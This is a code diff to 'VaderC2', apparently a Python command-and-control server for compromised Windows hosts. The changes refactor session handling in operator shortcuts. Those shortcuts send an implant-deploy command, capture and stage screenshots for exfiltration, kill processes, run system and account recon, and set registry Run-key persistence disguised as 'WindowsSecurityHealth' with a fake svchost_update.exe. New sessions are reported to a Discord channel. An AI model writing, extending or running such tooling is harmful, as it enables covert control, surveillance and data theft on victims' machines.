@@ -665,7 +665,7 @@ class VaderC2:
                 # ── SHORTCUTS ──
                 elif cmd == "deploy":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
                     if not matches:
                         print(f"  {RED}[!] No TCP session matching '{sid}'. Use 'sessions' to find one.{RST}")
                     else:
@@ -685,14 +685,14 @@ class VaderC2:
                         )
                         print(f"  {AMBER}[*] Deploying implant via {matches[0][:8]}...{RST}")
                         try:
-                            s["socket"].sendall((deploy_cmd + "\n").encode("utf-8"))
+                            s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
                             print(f"  {GREEN}[+] Deploy command sent. Watch Discord #c2 for new session.{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] Send failed: {e}{RST}")
 
                 elif cmd == "screenshot":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
                     if not matches:
                         print(f"  {RED}[!] No TCP session matching '{sid}'. Need interactive shell.{RST}")
                     else:
@@ -709,7 +709,7 @@ class VaderC2:
                         )
                         print(f"  {AMBER}[*] Capturing screen via {matches[0][:8]}...{RST}")
                         try:
-                            s["socket"].sendall((shot_cmd + "\n").encode("utf-8"))
+                            s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
                             print(f"  {GREEN}[+] Screenshot → C:\\Users\\Public\\screen.png on target{RST}")
                             print(f"  {DIM}  Exfil with: exfil C:\\Users\\Public\\screen.png{RST}")
                         except Exception as e:
@@ -721,21 +721,21 @@ class VaderC2:
                     else:
                         proc_name = args[0]
                         sid = args[1] if len(args) > 1 else ""
-                        matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                        matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
                         if not matches:
                             print(f"  {RED}[!] No TCP session. Interact first.{RST}")
                         else:
                             s = self.sessions[matches[0]]
                             kill_cmd = f"taskkill /F /IM {proc_name}"
                             try:
-                                s["socket"].sendall((kill_cmd + "\n").encode("utf-8"))
+                                s.sock.sendall((kill_cmd + "\n").encode("utf-8"))
                                 print(f"  {GREEN}[+] Sent: {kill_cmd}{RST}")
                             except Exception as e:
                                 print(f"  {RED}[!] {e}{RST}")
 
                 elif cmd == "recon":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
                     if not matches:
                         print(f"  {RED}[!] No TCP session.{RST}")
                     else:
@@ -743,13 +743,13 @@ class VaderC2:
                         recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
                         print(f"  {AMBER}[*] Running recon on {matches[0][:8]}...{RST}")
                         try:
-                            s["socket"].sendall((recon_cmd + "\n").encode("utf-8"))
+                            s.sock.sendall((recon_cmd + "\n").encode("utf-8"))
                         except Exception as e:
                             print(f"  {RED}[!] {e}{RST}")
 
                 elif cmd == "persist":
                     sid = args[0] if args else ""
-                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
                     if not matches:
                         print(f"  {RED}[!] No TCP session.{RST}")
                     else:
@@ -760,7 +760,7 @@ class VaderC2:
                             '/d "C:\\Users\\Public\\svchost_update.exe" /f'
                         )
                         try:
-                            s["socket"].sendall((persist_cmd + "\n").encode("utf-8"))
+                            s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
                             print(f"  {GREEN}[+] Persistence set: HKCU\\Run\\WindowsSecurityHealth{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] {e}{RST}")
